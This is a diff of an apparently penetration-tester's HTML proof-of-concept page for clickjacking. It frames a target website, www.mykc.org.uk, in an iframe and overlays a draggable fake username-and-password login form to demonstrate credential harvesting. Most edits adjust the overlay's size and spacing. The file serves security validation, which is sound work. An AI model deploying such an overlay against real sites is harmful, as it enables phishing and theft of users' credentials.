@@ -6,8 +6,8 @@
 
 An example HTML page to validate clickjacking, which displays the target URL in an iframe 
 and overlays a logon form over it to demonstrate how the credentials could be harvested.
-The height and width of the overlay can be adjusted (line 50, below) and then, to get decent 
-screenshots, the login form can be moved into position by dragging the top border.
+The height and width of the overlay can be adjusted (line 50, below) and then, to get decent screenshots, the login form 
+can be moved into position by dragging the top border.
 
 Low risk (CVSS 2.9), as a link to this page would need to be fed to a user.
 
@@ -45,15 +45,18 @@ Low risk (CVSS 2.9), as a link to this page would need to be fed to a user.
 <!-- 
 Adjust the WIDTH and HEIGHT of the login overlay here: 
 <!--== OVERLAY BEGINS HERE =============================================-->
-<div id="clickjacking" style= '
+<div id="clickjacking" style= "
 
-    width:230px; height:150px;
+    width:430px; height:150px;
 
-'>
+">
 	<div id="clickjackingheader"></div>
 	
-    <table>
-        <tr><td style="height: 5px;"></td></tr>
+    <table style="width:100%">
+<!--================================================================================-->
+<!--Move the input boxes up or down by altering the HEIGHT of the spacer row here: -->
+<!--================================================================================-->
+        <tr><td style="height: 8px;"></td></tr>
 		<tr><td>
 <!--======================================================================-->
 <!--  INPUT FIELD WIDTHS ARE CURRENTLY SET TO 99% OF THE PARENT ELEMENT   -->
@@ -62,14 +65,16 @@ Adjust the WIDTH and HEIGHT of the login overlay here:
 <!--======================================================================-->
                     Username <span style="color: Red">*</span>
 					
-                    <input name="Username" type="text" id="txtUserName" style="width: 99%;" />
+                    <input name="Username" type="text" id="txtUserName" style="width:99%;" />
 <!--===== NOTE: FIELD WIDTHS CAN ALSO BE FIXED, e.g. width: 200px; =======-->
+
+
 &nbsp;<br>
 <!--======================================================================-->
 <!-- The label text and width of the PASSWORD field can be adjusted here: -->
 <!--======================================================================-->
                     Password <span style="color: Red">*</span><br>
-                    <input name="Password" type="password" id="txtPassword" style="width: 99%;" />
+                    <input name="Password" type="password" id="txtPassword" style="width:99%;" />
 <!--======================================================================-->
             </td>
         </tr>
@@ -77,7 +82,7 @@ Adjust the WIDTH and HEIGHT of the login overlay here:
 <!--================================================================================-->
 <!--Move the LOGIN button up or down by altering the HEIGHT of the spacer row here: -->
 <!--================================================================================-->
-			<td colspan="2" style="height: 20px"></td>
+			<td colspan="2" style="height: 12px"></td>
 		</tr>
 		 <tr>
             <td>
@@ -149,7 +154,7 @@ Click <a href=""><b>HERE</b></a> to be redirected to a page of my choice.<p>
 
 <!-- change the target URL here:  -->
 <!--======================================================================--> 
-<iframe width=85% height=75% src="https://ual.stagingadministrateapp.com"</iframe>
+<iframe width=85% height=75% src="https://www.mykc.org.uk/"</iframe>
 <!--======================================================================-->
 
 </center>
